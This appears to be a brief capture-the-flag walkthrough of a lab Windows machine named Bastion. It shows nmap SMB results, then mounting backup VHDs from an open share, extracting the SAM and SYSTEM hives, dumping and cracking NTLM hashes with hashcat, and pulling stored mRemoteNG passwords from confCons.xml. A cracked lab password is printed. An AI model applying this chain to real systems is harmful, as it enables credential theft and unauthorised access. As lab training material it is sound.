135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)


Host script results:
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time:
|   date: 2024-06-16T15:23:31
|_  start_date: 2024-06-16T15:09:03
|_clock-skew: mean: -39m58s, deviation: 1h09m14s, median: 0s
| smb-os-discovery:
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: Bastion
|   NetBIOS computer name: BASTION\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2024-06-16T17:23:33+02:00
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required





sudo mount //10.10.10.134/Backups ./

in here are 2 vhd files:
WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351

moounting these 2, one includes just the boot drive
the other includes the c drive

where we can dowdnload the
Windows\System32\config\SAM
Windows\System32\config\SYSTEM

using these we can dump the hashes:
samdump2 SYSTEM SAM > hash

hashcat -m 1000 -a 0 hash /usr/share/wordlists/rockyou.txt

L4mpje:bureaulampje
so we can now ssh into the box

going to c:/program files (x86)/

we find there is a remote desktop connection manager
mRemoteNG

and we find the password hashes in: %AppData%\mRemoteNG\confCons.xml

downloading mRemoteNG and  running it

we can import the config file,
creating an external tool with cmd /k echo "password %password%"
we can retrieve the password and use it to ssh into the box